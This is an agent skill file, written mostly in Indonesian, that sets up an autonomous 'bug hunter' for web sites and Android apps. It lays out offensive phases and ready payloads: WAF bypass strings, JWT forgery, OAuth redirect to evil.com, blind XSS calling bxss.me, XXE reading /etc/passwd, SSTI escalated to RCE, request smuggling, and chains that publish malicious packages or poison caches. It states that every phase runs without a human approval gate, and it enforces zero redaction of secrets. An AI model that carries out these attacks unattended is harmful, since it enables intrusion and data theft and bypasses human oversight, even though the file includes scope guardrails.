---
name: bug-hunter
description: 'Autonomous Bug Hunter & Vulnerability Assessor for Web & Android APK — ELITE EDITION. Covers WAF detection/bypass, subdomain brute-force, tech fingerprint, JS secret scan, JWT crack/forge, parameter fuzzing, GraphQL abuse, WebSocket probe, CVE matching, OAuth2/OIDC abuse, 2FA bypass, business logic testing, API versioning abuse, blind vulnerability detection (SQLi/SSRF/XSS via DNS canary), mobile deep link hijack, cache poisoning, subdomain takeover detection, HTTP Request Smuggling (CL.TE/TE.CL), SSTI/XXE/LFI/Prototype Pollution/Clickjacking, CORS credentialed wildcard + DNS Rebinding, Dependency Confusion supply chain, full exploit chaining with auto severity escalation, chaos/monkey testing with verified cleanup, Playwright live watch mode with diff engine, multi-platform bug bounty templates (HackerOne/Bugcrowd/generic), and ONE consolidated Word (.docx) report with PoC, CVSS, kill chain narrative. Trigger: "hunt [url|apk]", "hunt web [url]", "hunt apk [path|pkg]", "hunt --watch [interval] [url]", "bughunt <target>".'
---

# AUTONOMOUS BUG HUNTER (`bug-hunter`) — ELITE EDITION

Skill ini mengubah satu perintah menjadi operasi bug hunting level elite yang berjalan sendiri. User hanya memberi target; agent melakukan selebihnya: WAF bypass, JWT crack, OAuth abuse, 2FA bypass, business logic, blind vuln, cache poisoning, subdomain takeover, exploit chaining, chaos, cleanup, live diff dashboard, dan satu laporan Word terpadu.

---

## 0. ALUR OTONOM (VIBE BUG HUNTING LOOP — ELITE)

```
resolve → waf-detect → surface-expand → subdomain-takeover
        → recon → jwt-analyze → oauth-probe → 2fa-bypass
        → param-fuzz → api-version → graphql-probe → websocket-probe
        → assess → blind-detect → business-logic → cache-poison
        → cve-match → exploit-chain → chaos → cleanup
        → verify-cleanup → triage → report → [watch-diff?] → stop
```

Semua fase berjalan otomatis tanpa gate. Tidak ada `exploit ok`. Auto-stop hanya jika target produksi live dengan risiko perubahan data permanen tak ter-rollback.

---

## 1. FASE DETAIL

### §0 — Resolve
- Deteksi tipe target (Web / APK / hybrid) dari argumen atau dokumen workspace.
- Cek scope: domain in-scope, wildcard subdomain, out-of-scope list dari dokumen program bug bounty.
- Load kredensial dari `.env.qa` atau `qa-credentials.local.json` — tidak pernah diminta di chat.
- Tentukan profil laporan: `bughunt`, `bughunt-apk`, atau `bughunt-all`.

### §1 — WAF Detection & Bypass Strategy

**Deteksi:**
- Fingerprint dari response header: `cf-ray` (Cloudflare), `x-sucuri-id` (Sucuri), `x-akamai-*` (Akamai), `x-waf-event-info` (Imperva/Incapsula), `server: awselb` (AWS WAF).
- Kirim benign probe dulu, lalu payload ringan — bandingkan status code dan response body.
- Jika 403/406/429 muncul pada payload biasa → WAF aktif.

**Bypass strategy (urutan otomatis):**
1. **Header spoofing**: `X-Originating-IP: 127.0.0.1`, `X-Forwarded-For: 127.0.0.1`, `X-Remote-Addr: 127.0.0.1`.
2. **Encoding variation**: URL encode (`%27`), double encode (`%2527`), unicode (`\u0027`), hex (`\x27`).
3. **Case mutation**: `SeLeCt`, `uNiOn`, `ScRiPt`.
4. **Chunked transfer encoding** untuk bypass body inspection.
5. **Whitespace injection**: `un/**/ion`, `sel%0aect`.
6. Catat WAF type, bypass yang berhasil, dan bypass yang gagal — semua masuk triage.

### §2 — Surface Expand & Subdomain Takeover

**Subdomain Enumeration — multi-source:**
- `crt.sh`, `dns.bufferover.run`, `hackertarget.com`, `alienvault OTX`, `urlscan.io`.
- Jika `SHODAN_API_KEY` / `SECURITYTRAILS_KEY` ada di `.env.qa`: gunakan API tersebut.

**Subdomain Brute-Force (wordlist built-in):**
```
www, api, admin, app, dev, staging, test, beta, portal, dashboard,
mail, ftp, vpn, cdn, static, assets, media, upload, download,
auth, login, oauth, sso, internal, intranet, corp, cloud, s3,
ws, websocket, graphql, gql, grpc, monitor, status, health
```

**Subdomain Takeover Detection:**
Setelah subdomain ditemukan, cek apakah ada yang rentan takeover:
- Resolve CNAME tiap subdomain → cek apakah pointing ke layanan yang sudah dihapus.
- Layanan yang dicek: `GitHub Pages` (cname ke `*.github.io` tapi repo tidak ada), `Heroku` (cname ke `*.herokudns.com` tapi app tidak ada), `AWS S3` (bucket tidak ada), `Azure` (`.azurewebsites.net` tidak terdaftar), `Netlify`, `Vercel`, `Shopify`, `Fastly`.
- Jika respons menunjukkan "No Such Bucket", "There isn't a GitHub Pages site here", atau "No such app" → **SUBDOMAIN TAKEOVER CONFIRMED** → severity HIGH/CRITICAL.
- Eksploit takeover: buat resource di layanan tersebut, verifikasi kontrol subdomain.

**Technology Fingerprinting (Wappalyzer-style):**
- Server, framework, CDN, WAF dari header + HTML pattern + JS framework detection.

**Port Probe Ringan:** 80, 443, 8080, 8443, 3000, 3001, 4000, 4443, 5000, 8000, 8888, 9000, 9090.

**Robots.txt, Sitemap, JS File Analysis:** endpoint tersembunyi + secret hunting (AWS key, token, Firebase, S3).

### §3 — Recon
- Audit header keamanan, CORS, cookie flags, TLS version, error disclosure.
- APK: manifest audit, exported components, cleartext traffic, SSL pinning.
- Output → `pendukung/reconnaissance/`.

### §4 — JWT Analysis

1. **Decode** header + payload → tampilkan claims lengkap.
2. **Algorithm check**: `alg: none` → kirim tanpa signature; `HS256` → brute-force secret (256+ kata umum); `RS256` → confusion attack (ganti ke HS256, sign dengan public key).
3. **Claim tampering**: ubah `role: user` → `role: admin`, ubah `sub`, extend `exp`.
4. **kid injection**: SQL injection di `kid` claim, path traversal.
5. **jku/x5u hijacking**: ganti URL key ke endpoint milik sendiri.

### §5 — OAuth 2.0 / OIDC Abuse

Deteksi OAuth: cari `/oauth/authorize`, `/oauth/token`, `/.well-known/openid-configuration`.

**Probe yang dijalankan otomatis:**
1. **State parameter CSRF**: kirim request tanpa `state` atau dengan `state` tetap → jika login berhasil = CSRF pada OAuth.
2. **Redirect URI bypass**:
   - `redirect_uri=https://target.com.evil.com/`
   - `redirect_uri=https://target.com/callback/../../../evil`
   - `redirect_uri=https://target.com/callback%40evil.com`
   - Jika authorization code/token diarahkan ke domain lain = CRITICAL.
3. **Implicit flow token leak**: cek apakah `access_token` muncul di URL fragment yang bisa diakses via `Referer` header.
4. **Token leakage via Referer**: cek apakah halaman post-login include token di URL yang kemudian ter-leak di Referer ke third-party resource.
5. **PKCE bypass**: coba exchange code tanpa `code_verifier` pada flow yang seharusnya pakai PKCE.
6. **Open redirect chaining**: gabungkan open redirect di target dengan OAuth → steal authorization code.
7. **Account linking abuse**: coba link akun OAuth dari provider lain ke akun yang sudah ada (pre-account takeover).
8. **scope escalation**: minta scope lebih dari yang diizinkan (`scope=admin offline_access`).

### §6 — 2FA / OTP Bypass

Deteksi 2FA: cari form OTP, TOTP input, SMS verification step.

**Probe yang dijalankan otomatis:**
1. **Response manipulation**: intercept response "2FA required" → ubah `"mfa_required": true` → `false` via Playwright response override.
2. **Rate limit absent**: kirim 100 OTP berbeda secara cepat → jika tidak di-block = brute-force possible.
3. **Code reuse**: pakai OTP yang sama dua kali → jika diterima = no invalidation after use.
4. **Code length brute**: coba semua kombinasi 4-digit (0000–9999) atau 6-digit bila rate limit tidak ada.
5. **Backup code leak**: probe `/api/user/backup-codes`, `/account/recovery` tanpa auth.
6. **Skip step**: langsung akses URL post-2FA tanpa menyelesaikan 2FA flow → jika berhasil = bypass.
7. **Null/empty OTP**: kirim `otp: null`, `otp: ""`, `otp: 000000` → jika diterima = validation absent.

### §7 — Parameter Discovery & Fuzzing

**Hidden parameter discovery** via wordlist: `debug, test, admin, internal, dev, verbose, trace, log, dump, export, format, type, action, callback, redirect, url, next, return, goto, target, id, user_id, account_id, order_id, file, path, page, limit, token, key, secret, api_key, auth, session, csrf`.

**Value fuzzing per tipe**: integer overflow, string null/undefined/array, UUID confusion, path traversal.

**Mass assignment probe**: `is_admin: true`, `role: admin`, `verified: true`, `price: 0`, `discount: 100`.

### §8 — API Versioning Abuse

**Probe otomatis:**
1. Jika target pakai `/api/v2/endpoint`, coba juga `/api/v1/endpoint`, `/api/v0/endpoint`, `/api/endpoint`.
2. Versi lama sering lebih permisif: tidak ada auth check, tidak ada rate limit, response lebih verbose.
3. Coba juga header versioning: `Accept: application/vnd.api+json;version=1`, `API-Version: 1`.
4. Cari deprecated endpoint di JS file / dokumentasi publik / `robots.txt`.
5. Jika versi lama return data lebih banyak atau tanpa auth → severity HIGH, dokumentasikan perbedaan response.

### §9 — GraphQL Probe

Deteksi: `/graphql`, `/api/graphql`, `/gql`, `/query`, `/v1/graphql`.

1. **Introspection**: `{__schema{types{name fields{name}}}}` → map schema.
2. **Field suggestion abuse**: kirim field salah eja → enumerate schema tanpa introspection.
3. **Batch query abuse**: 100 query sekaligus → cek rate limit.
4. **Mutation probe**: cari mutation tanpa autentikasi.
5. **Deep nesting DoS**: query bersarang 10+ level.
6. **IDOR via GraphQL**: query object milik user lain via ID.
7. **Injeksi di argument**: `{user(id: "1 OR 1=1"){email}}`.

### §10 — WebSocket Probe

Deteksi: `Upgrade: websocket` header, `new WebSocket(` di JS, `socket.io`, `sockjs`.

1. Connect via Playwright, probe auth bypass, message injection, subscription abuse, origin check, reconnect flood.

### §11 — Assess (Full Vulnerability Assessment)

*Web:* Missing headers, CORS, IDOR, unauth endpoint, XSS, SQLi, open redirect, path traversal, SSRF, SSTI, XXE, prototype pollution, HTTP request smuggling.

*APK:* Storage privat, cleartext traffic, SSL pinning, exported component, clipboard exposure, `FLAG_SECURE`.

### §12 — Blind Vulnerability Detection

Teknik khusus untuk kerentanan yang tidak langsung terlihat dari response:

**Blind SQLi (Time-Based):**
- Inject `'; WAITFOR DELAY '0:0:5'--` (SQL Server), `'; SELECT SLEEP(5)--` (MySQL), `'; SELECT pg_sleep(5)--` (PostgreSQL).
- Jika response time meningkat 5 detik → Blind SQLi confirmed.
- Otomatis enumerate: DB version, jumlah kolom, nama tabel pertama.

**Blind SSRF (via DNS Canary):**
- Gunakan domain canary yang dikontrol agent: format `{target_hash}.bxss.me` atau `{unique_id}.oastify.com` (jika tersedia via `.env.qa`).
- Inject ke semua parameter yang menerima URL: `url=`, `redirect=`, `webhook=`, `avatar=`, `import=`, `fetch=`.
- Juga inject ke header: `X-Forwarded-For`, `X-Original-URL`, `Referer`, `Host`.
- Jika DNS lookup terjadi ke canary domain → Blind SSRF confirmed → severity HIGH/CRITICAL.

**Blind XSS (via Canary Payload):**
- Inject payload yang report balik ke endpoint: `<script src="https://bxss.me/t/probe.js?uid={id}"></script>`.
- Target field: comment, feedback, nama profil, subject tiket support — field yang mungkin di-render oleh admin/moderator.
- Jika callback diterima → Stored Blind XSS confirmed → severity HIGH/CRITICAL.

**Out-of-Band XXE:**
- `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]>` → embed di XML request.
- Jika callback ke canary → XXE confirmed dengan OOB exfiltration potential.

### §13 — Business Logic Testing

**Probe yang dijalankan otomatis:**
1. **Negative price / zero price**: kirim `price: -1`, `price: 0`, `amount: -100` pada endpoint transaksi.
2. **Coupon stacking**: apply kupon yang sama berkali-kali dalam satu order.
3. **Race condition pada limit**: parallel request ke endpoint yang harusnya 1x (klaim reward, referral bonus, vote).
4. **Privilege escalation via parameter**: ubah `user_id` ke ID lain pada endpoint edit profil/akun.
5. **Workflow bypass**: skip step checkout (langsung ke `/order/confirm` tanpa `/order/payment`).
6. **Quantity manipulation**: order 0 item, order -1 item, order 999999 item.
7. **Free item via refund abuse**: probe apakah refund bisa dilakukan sebelum item dikirim.
8. **Role boundary**: pakai akun user biasa, coba endpoint admin dengan semua method.

### §14 — Cache Poisoning

**Web Cache Poisoning:**
1. Tambahkan unkeyed header ke request dan amati apakah masuk ke response yang di-cache:
   - `X-Forwarded-Host: evil.com` → jika response berisi `evil.com` = Host header injection + cache poisoning potential.
   - `X-Forwarded-Scheme: http` → downgrade HTTPS ke HTTP dalam response.
   - `X-Original-URL: /admin` → path override.
2. Konfirmasi cache: kirim request kedua tanpa header tersebut → jika response masih berisi nilai evil = cache poisoned.
3. Severity: MEDIUM jika lokal, HIGH/CRITICAL jika bisa poisoning global CDN cache.

**Web Cache Deception:**
1. Probe `/account/profile/nonexistent.css`, `/dashboard/settings.jpg` — tambah ekstensi statis ke URL privat.
2. Jika server melayani halaman autentikasi dengan ekstensi statis → cache menyimpan halaman privat → pengguna lain bisa akses via URL yang sama.

### §15 — HTTP Request Smuggling

Probe CL.TE / TE.CL / HTTP/2 downgrade pada setiap endpoint yang melewati reverse proxy atau CDN.

**CL.TE probe:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Jika response berikutnya dari request normal mengembalikan error 400 atau respon tak terduga → CL.TE confirmed.

**TE.CL probe:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**TE.TE obfuscation:** variasikan header: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding: chunked, identity`.

**HTTP/2 downgrade:** jika frontend HTTP/2, backend HTTP/1.1 → inject via pseudo-header atau header smuggling.

Jika confirmed → chain ke: bypass frontend auth, poison request queue, session hijacking antarpengguna, XSS via CORS bypass.

### §16 — Advanced Injection — SSTI, XXE, LFI, Prototype Pollution, Clickjacking

**SSTI (Server-Side Template Injection):**
- Payload probe: `{{7*7}}` → `49` (Jinja2/Twig), `${7*7}` → `49` (FreeMarker/Thymeleaf), `<%= 7*7 %>` (ERB), `#{7*7}` (Ruby).
- Jika terkonfirmasi → escalate ke RCE: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.

**XXE (XML External Entity):**
- Target: endpoint upload XML, DOCX, SVG, XLSX, JSON dengan Content-Type override.
- Payload OOB: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{canary}/xxe">]>` → verify DNS callback.
- Payload file read: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.

**Path Traversal / LFI:**
- Probe: `../../../etc/passwd`, `%2e%2e%2fetc%2fpasswd`, `..%252f..%252fetc%252fpasswd`.
- Target: file download endpoint, image viewer, `file=`, `path=`, `doc=`, `template=` parameter.
- Windows target: `..\..\..\windows\win.ini`.

**Prototype Pollution:**
- JSON body: `{"__proto__": {"admin": true}}`, `{"constructor": {"prototype": {"admin": true}}}`.
- Query string: `?__proto__[admin]=true`.
- Jika terkonfirmasi → test privilege escalation: request endpoint admin dengan token user biasa.

**Clickjacking:**
- Cek `X-Frame-Options` dan `Content-Security-Policy: frame-ancestors` header.
- Jika absent → generate PoC iframe HTML: `<iframe src="https://target.com/settings/change-email" style="opacity:0.1">`.
- Severity HIGH jika halaman sensitif (password change, delete account, transfer dana) bisa di-frame.

### §17 — Client-Side — CORS & DNS Rebinding

**CORS Credentialed Wildcard:**
- Probe: kirim request dengan `Origin: https://evil.com` + `withCredentials: true`.
- Jika response: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` → CRITICAL.
- Bukti aktual: `fetch('https://target.com/api/me', {credentials: 'include'})` dari origin berbeda via Playwright.
- Cek juga: `Origin: null` → jika allowed = sandbox bypass.

**DNS Rebinding:**
- Deteksi SPA yang memanggil `localhost` atau IP private via API.
- Probe: apakah ada endpoint yang bergantung pada Host header untuk validasi SSRF protection.
- Jika target punya API yang accessible via localhost → DNS rebinding bisa bypass same-origin → severity HIGH.

### §18 — Dependency Confusion (Supply Chain)

**Probe otomatis:**
1. Scan semua file `package.json`, `requirements.txt`, `Gemfile`, `build.gradle`, `pom.xml`, `composer.json` yang ditemukan via JS file analysis atau endpoint publik.
2. Scan JS bundle untuk nama package internal: nama yang tidak ada di registry publik atau pakai namespace perusahaan (`@company/internal-lib`).
3. Check registry publik:
   - npm: `https://registry.npmjs.org/{package-name}`
   - PyPI: `https://pypi.org/pypi/{package-name}/json`
   - RubyGems: `https://rubygems.org/api/v1/gems/{gem-name}.json`
4. Jika nama package internal ADA di registry publik (dan bukan milik target) → Dependency Confusion CONFIRMED → severity HIGH/CRITICAL.
5. Jika tidak ada → nama tersebut bisa di-claim → dokumentasikan sebagai temuan.

### §19 — Mobile Deep Link & Intent Hijacking

**Probe APK:**
1. Parse `AndroidManifest.xml` → identifikasi semua `<intent-filter>` dengan scheme custom (`myapp://`, `intent://`).
2. Exported activity tanpa `android:permission` → langsung accessible dari app lain.
3. **Deep link IDOR**: deep link yang pass user ID / token di URI → `myapp://profile?user_id=123` → ubah ke ID lain.
4. **Universal link validation**: probe apakah `/.well-known/assetlinks.json` terkonfigurasi benar → jika tidak = any app bisa intercept.
5. **WebView injection**: jika deep link membuka WebView dengan URL dari parameter → inject `javascript:` scheme atau path traversal.
6. **Intent redirection**: kirim intent ke exported activity dengan data URL yang redirect ke app lain.

Eksekusi via ADB:
```bash
adb shell am start -a android.intent.action.VIEW -d "myapp://admin?user_id=1" com.target.app/.MainActivity
```

### §20 — CVE Matching dari Tech Fingerprint

Lookup via NIST NVD API: `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={tech}+{version}&cvssV3Severity=HIGH`

Mapping otomatis: Nginx, WordPress, jQuery, OpenSSL, Apache Struts, Log4j, Spring Boot, Rails, Laravel, Django.

### §21 — Exploit Chain (Full Auto)

| Chain | Trigger | Eksekusi |
|---|---|---|
| Account Takeover | IDOR + weak/no auth | Enumerate ID → access victim resource → verify data |
| Auth Bypass | Unauth endpoint | Direct access admin endpoint → extract response |
| SQLi Extraction | SQLi confirmed | Enum columns → extract DB version, tables, sample data |
| Blind SQLi | Time-based confirmed | Enumerate table names char by char |
| SSRF Pivot | SSRF confirmed | Probe internal services → map internal network |
| JWT Takeover | JWT vuln confirmed | Forge admin token → access privileged resource |
| OAuth Code Steal | Redirect URI bypass | Redirect auth code to controlled endpoint |
| 2FA Skip | Bypass confirmed | Access post-2FA resource without completing flow |
| GraphQL Enum | Introspection + IDOR | List all user IDs → extract emails/data |
| XSS Session Hijack | Reflected XSS | Inject payload → capture cookie ke canary |
| Race Condition Win | Race endpoint | 10 parallel requests → verify inconsistent state |
| Prototype Pollution | PP confirmed | Escalate `__proto__.admin=true` → test privilege |
| Log4Shell | Log4j detected | Inject JNDI string → verify callback (canary) |
| SSTI RCE | SSTI confirmed | Escalate template injection → OS command execution |
| Subdomain Takeover | Dangling CNAME | Claim subdomain via target service |
| Cache Poisoning | Unkeyed header | Poison cache → serve malicious content |
| Business Logic | Logic flaw confirmed | Negative price / race condition → extract value |
| Request Smuggling | CL.TE/TE.CL | Poison queue → hijack next user request |
| Dep Confusion | Public package exists | Publish malicious package → intercept install |
| Deep Link Hijack | Exported activity | ADB intent → access privileged screen/data |

**Auto-escalate severity** jika chain berhasil: IDOR (MEDIUM) + admin access → HIGH; XSS + hijack → CRITICAL; SSRF + internal pivot → CRITICAL; SSTI + RCE → CRITICAL.

### §22 — Chaos / Monkey Testing

*Web:* Input fuzzing (10k+, unicode, null byte, format string, prototype pollution), HTTP method mangling, race condition 10 parallel, error disclosure, large file upload.

*APK:* `adb shell monkey -p <pkg> --throttle 100 -v 1000`, intent injection, low-memory kill, permission revoke mid-session.

### §23 — Cleanup (Auto)

| Jejak | Metode |
|---|---|
| Browser cookies & session | `browser_clear_cookies`, logout endpoint |
| Local storage / IndexedDB | `localStorage.clear(); sessionStorage.clear()` via Playwright |
| Data uji via API | Endpoint delete/rollback dengan ID yang dicatat selama exploit |
| File temporer device | `adb shell rm -rf` |
| Log buffer device | `adb logcat -c` |
| Proxy config emulator | `adb shell settings put global http_proxy :0` |
| Data tidak bisa dihapus | Catat untuk vendor → cleanup status = `PARTIAL` |

### §24 — Verify-Cleanup
- Status: `VERIFIED` atau `PARTIAL`.

### §25 — Triage
- Tulis semua ke `pendukung/ai/triage.json`: findings, kill chains, CVE matches, WAF status, JWT, OAuth, 2FA, subdomain takeover, cache poisoning, blind vuln, business logic, smuggling, SSTI/XXE/LFI, CORS, DNS rebinding, dependency confusion, deep link hijack.

### §26 — Report
- DOCX: `build_report.py --profile bughunt`.
- SATU dokumen Word final terpadu — seluruh hasil recon, temuan kerentanan, kill chain, risk register, format submission bug bounty (HackerOne / Bugcrowd), dan **bab Kesimpulan & Rekomendasi Akhir** tercakup langsung di dalam bab dan lampiran DOCX. Tidak ada file `.md` terpisah.
- **Aturan bukti temuan — temuan sekecil apa pun tidak boleh lolos dari report.** Setiap anomali yang teramati wajib masuk `findings` di `triage.json` dan tampil di DOCX; tidak boleh dibuang, difilter, atau dianggap terlalu sepele untuk ditulis. INFO/LOW/informatif/header missing/versi terekspos tetap wajib lengkap. Untuk **setiap** temuan:
  1. **Proses kejadian (PoC) eksplisit dan berurutan** — tulis aksi nyata: request apa yang dikirim, URL/endpoint/host:port, header/payload apa, klik/tap tombol mana, dan respons yang muncul. Jangan hanya menulis "header tidak ada". Contoh: `1. curl -I https://target.com/; 2. Amati respons tidak memuat Content-Security-Policy; 3. Bandingkan dengan endpoint /admin yang juga kosong.`
  2. **Screenshot asli + anotasi merah** — ambil screenshot/capture saat pembuktian, lalu **lingkari** (default) atau **kotakkan merah** area temuan. Simpan file aslinya di `pendukung/bukti/screenshots/`, lalu cantumkan anotasinya di field `shots` tiap finding di `triage.json` (generator menyisipkan semua gambar, bukan hanya yang pertama):
     ```json
     "shots": [{
       "ref": "pendukung/bukti/screenshots/01_header.png",
       "highlight": {"type": "circle", "x": 0.62, "y": 0.31, "w": 0.18, "h": 0.12},
       "label": "Header tidak ada di sini"
     }]
     ```
     `x,y,w,h` relatif 0–1 terhadap ukuran gambar (nilai >1 dibaca piksel). `type: "box"` untuk kotak; alternatif lingkaran: `{"type":"circle","cx":...,"cy":...,"r":...}`.
  3. **Tertanam di DOCX** — generator menyisipkan gambar yang sudah dilingkari merah **tepat di bawah temuan yang bersangkutan**, lengkap dengan caption label. Jika `highlight` kosong, DOCX menandai *"belum dianotasi merah"* dan temuan dianggap belum selesai.
- Watch dashboard: `watch-dashboard.html`.

### §26b — Verifikasi database (read-only) untuk pembuktian PoC
Gunakan bila temuan keamanan perlu dibuktikan dengan data nyata tanpa mengubahnya.

1. **Otorisasi tertulis tetap wajib** — scope harus mencakup database yang diakses. Gunakan akun
   **read-only** dan staging/UAT terlebih dahulu; produksi hanya dengan approval eksplisit.
2. **Koneksi dari file kredensial lokal** — prioritas: `QA_CREDENTIALS_FILE` →
   `%USERPROFILE%\.config\opencode\qa-credentials.local.json` → `qa-credentials.local.json` di folder skill.
   Repo menyimpan **`qa-credentials.example.json`** (template kosong, aman di-commit). Setelah clone:
   `copy qa-credentials.example.json qa-credentials.local.json`, lalu isi file `.local.json` —
   nama itu sudah masuk `.gitignore`, jadi password tidak bisa ikut ter-commit. Blok `db` berisi
   `sqlite` / `server` / `database` / `user` / `password` / `auth` / `driver` / `limit`.
   Environment variable (`QA_DB_SQLITE`, `QA_DB_SERVER`, `QA_DB_NAME`, `QA_DB_USER`, `QA_DB_PASS`,
   `QA_DB_AUTH`, ...) tetap lebih prioritas. Password tidak pernah ditulis di chat/spec/DOCX.
3. **Jalankan** `python db_verify.py --checks <file-json> --out pendukung/ai/db-verification.json`.
   Hanya `SELECT` / `WITH` / `PRAGMA`, satu statement per check — `INSERT`/`UPDATE`/`DELETE`/`DROP`
   dan multi-statement ditolak otomatis.
4. **Masukkan bab** `"db_verification"` ke `report.chapters` agar generator menyisipkan ringkasan
   koneksi, tabel query–status, dan baris hasil query ke DOCX.
5. **Bila asersi `FAIL`/`ERROR`** → buat temuan dengan PoC berurutan + screenshot lingkaran merah.
   Bila database tidak terjangkau → `BLOCKED`, bukan diklaim aman.
6. Koneksi ini untuk **membuktikan**, bukan mengeksploitasi. Dilarang memakainya untuk mengubah,
   menghapus, atau mengekstrak data di luar scope yang disetujui.
7. **Stored procedure — baca definisi, jangan jalankan.** Kunci `sp`:
   - Nama exact: `{"sp":"dbo.ValidateProblem","expect":{"column":"definisi","contains_all":["IF @status","RAISERROR"]}}`
   - Banyak SP: `{"sp":"Valid*","limit":10,"offset":0}` — `*` wildcard nama; `offset`/`limit`
     paging, dan `total_matching` menyatakan total SP yang cocok.
   - Cari dari pesan: `{"sp":"*","definition_contains":"area wajib diisi"}` atau
     `{"sp":"*","definition_all":["IF @status","RAISERROR"]}` — melacak source notifikasi ke SP
     tanpa menjalankannya.
   Semua diterjemahkan menjadi `SELECT` ke `sys.sql_modules`/`sys.objects` dengan parameter binding.
   **`EXEC` sengaja ditolak** — prosedur bisa berisi DML/DDL dan akan mengubah bukti serta data.
   SQLite tidak punya SP; check `sp` di SQLite gagal dengan pesan yang jelas.

8. **Lacak notifikasi → SP tanpa mengisi kredensial.** Bila yang ada hanya teks notifikasi, jalankan
   `python find_notif.py --text "Validasi gagal: area wajib diisi"`. Skrip mencari targetnya sendiri:
   file kredensial → connection string di `appsettings*.json` / `web.config` / `.env` /
   `docker-compose*.yml` di sekitar workspace → instance lokal. Windows Integrated Auth dipakai bila
   tidak ada password, jadi **tidak perlu mengisi kredensial**. Hanya nama server/database yang
   diekstrak dari config — password tidak pernah dibaca, disimpan, atau ditampilkan. Output
   `pendukung/ai/sp-notif-search.json` berisi `database.schema.prosedur` dan baris definisi yang cocok.
   Tetap `SELECT` katalog, tanpa `EXEC`. Bila tidak ada target yang terjangkau → `BLOCKED`, bukan
   ditebak; yang diminta adalah nama instance/akses jaringan, **bukan password**.

### §27 — Watch Mode (Playwright Live Dashboard)

Aktif jika perintah menyertakan `--watch [interval_menit]`:
1. Playwright buka browser **visible (non-headless)**.
2. Navigasi ke `watch-dashboard.html` lokal.
3. Setiap N menit: jalankan ulang recon + assess (tanpa chaos ulang).
4. **Diff engine**: compare `triage.json` vs `triage-prev.json` → highlight temuan baru/changed/resolved.
5. Auto-refresh 10 detik. Stop: `stop hunt` di chat.

---

## 2. CARA MEMERINTAHKAN

| Perintah | Eksekusi |
|---|---|
| `hunt [url]` | Web hunting penuh semua fase. |
| `hunt web [url]` | Eksplisit web. |
| `hunt apk [path\|pkg]` | APK hunting penuh. |
| `hunt all [url] [apk]` | Hybrid web + APK, satu triage satu DOCX. |
| `hunt --watch 30 [url]` | Watch mode: hunt penuh → ulang tiap 30 menit → live diff dashboard. |

Alias: `bughunt [target]`, `bug hunter web <url>`, `bug hunter apk <file>`.

---

## 3. GUARDRAIL & ZERO REDACTION POLICY

1. **Otorisasi**: Jalankan hanya pada target milik sendiri, staging/UAT, atau program bug bounty dengan scope tertulis.
2. **Stop Produksi**: Eksploit yang akan mengubah data produksi permanen tanpa rollback → hentikan chain, tandai `BLOCKED`.
3. **Zero Redaction**: Nilai aktual dari artefak tampil apa adanya. Nilai tidak ada = `(...)`. Tidak ada `[REDACTED]`.
4. **Kredensial**: Tidak pernah diminta di chat. Tidak pernah ditulis ke log publik.
5. **iOS/IPA**: Belum didukung. Tandai `BLOCKED`. Tambah saat ada `xcrun simctl`.
6. **DoS dilarang**: Chaos testing dibatasi request count yang wajar; bukan flood/DDoS.

---

## 4. FORMAT TRIAGE.JSON STANDAR

```json
{
  "target": "https://target.com",
  "mode": "bughunt-web",
  "date": "2026-11-20",
  "environment": "Bug Bounty / Staging",
  "verdict": "CRITICAL FINDINGS — DO NOT RELEASE",
  "ticket_ref": "HackerOne / nama program",
  "report": {
    "profile": "bughunt",
    "output": "Laporan-BugHunter-target-20261120.docx",
    "page_breaks_before": ["kill_chains", "findings", "risk", "appendix_cases"]
  },
  "waf": {
    "detected": true, "type": "Cloudflare",
    "bypass_success": ["X-Forwarded-For: 127.0.0.1"],
    "bypass_failed": ["case mutation"]
  },
  "recon": {
    "subdomains_found": [
      {"host": "api.target.com", "ip": "1.2.3.4", "status": 200, "tech": "Node.js", "takeover": false},
      {"host": "old.target.com", "ip": null, "cname": "target.github.io", "status": 404, "takeover": true}
    ],
    "tech_stack": ["Nginx/1.18", "React", "Node.js/18"],
    "endpoints": [{"method": "GET", "url": "/api/v1/users", "auth": "None", "status": 200}],
    "secrets_detected": [{"type": "AWS Key", "location": "main.js:L1842", "value": "AKIA...", "risk": "CRITICAL"}]
  },
  "jwt_analysis": [],
  "oauth_analysis": [
    {
      "id": "OAUTH-01", "flow": "Authorization Code",
      "vulnerability": "redirect_uri bypass — code redirected to evil.com",
      "severity": "CRITICAL",
      "exploit": "Authorization code stolen, exchanged for access token"
    }
  ],
  "twofa_analysis": [
    {
      "id": "2FA-01", "method": "TOTP",
      "vulnerability": "Rate limit absent — 10000 OTP attempts allowed",
      "severity": "HIGH",
      "exploit": "Brute-forced 6-digit OTP in 30 minutes"
    }
  ],
  "blind_findings": [
    {
      "id": "BLIND-01", "type": "Blind SSRF",
      "location": "POST /api/webhook?url=",
      "canary_hit": "abc123.bxss.me DNS callback received",
      "severity": "HIGH"
    }
  ],
  "business_logic": [
    {
      "id": "BL-01", "type": "Race Condition",
      "location": "POST /api/coupon/apply",
      "finding": "Coupon applied 7 times simultaneously via race condition",
      "severity": "HIGH"
    }
  ],
  "cache_poisoning": [
    {
      "id": "CP-01", "type": "Web Cache Poisoning",
      "header": "X-Forwarded-Host: evil.com",
      "confirmed": true,
      "severity": "HIGH"
    }
  ],
  "subdomain_takeover": [
    {
      "id": "TAKE-01", "subdomain": "old.target.com",
      "cname": "target.github.io", "service": "GitHub Pages",
      "confirmed": false, "severity": "HIGH",
      "note": "Repo tidak ada — klaim dengan membuat repo GitHub Pages"
    }
  ],
  "cve_matches": [],
  "kill_chains": [],
  "chaos": {"cleanup_status": "VERIFIED", "tests": [], "cleanup_items": []},
  "findings": [],
  "passed_checks": [],
  "limitations": [],
  "summary": {
    "total_findings": 0,
    "by_severity": {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0},
    "verdict": "PENDING"
  }
}
```

---

## 5. STRUKTUR ARTEFAK

```
hasil-hunt-[target]-[tanggal]/
